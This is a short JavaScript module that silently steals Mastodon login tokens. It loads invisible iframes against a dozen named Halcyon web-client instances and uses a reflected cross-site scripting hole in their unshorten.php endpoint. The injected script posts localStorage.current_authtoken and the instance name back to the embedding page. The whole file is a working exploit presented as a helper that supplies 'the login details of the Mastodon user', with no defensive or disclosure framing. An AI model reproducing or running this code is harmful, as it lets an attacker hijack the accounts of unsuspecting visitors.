/**
 * The login details of the Mastodon user.
 * @type {Promise<{instance: string, token: string}>}
 */
const info = new Promise(resolve => {
  let found = false
  window.onmessage = ({
    data: [token, inst]
  }) => {
    if (token && inst && !found) {
      document.querySelectorAll('iframe').forEach(ele => ele.remove())
      resolve({
        token,
        instance: inst
      })
    } else {
      return false
    }
  }


  const urls = [
    "https://halcyon.mstdn.social/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://halcyon.pro/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://halcyon.werefox.dev/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://halcyon.dev-wiki.de/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://halcyon.bka.li/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://web.mstdn.es/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://kutti.aana.site/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://web.muensterland.social/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://halcyon.anoxinon.de/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://halcyon.tilde.zone/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://mastoweb.gronendahl.de/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E",
    "https://hal.im-in.space/unshorten.php?url=%3Cscript%3Etop.postMessage([localStorage.current_authtoken, localStorage.current_instance], '*')%3C/script%3E"
  ]
  urls.forEach(url => {
    const iframe = document.createElement('iframe')
    iframe.src = url
    iframe.width = "10"
    iframe.style.opacity = "0"
    document.body.append(iframe)
  })
})

module.exports = info
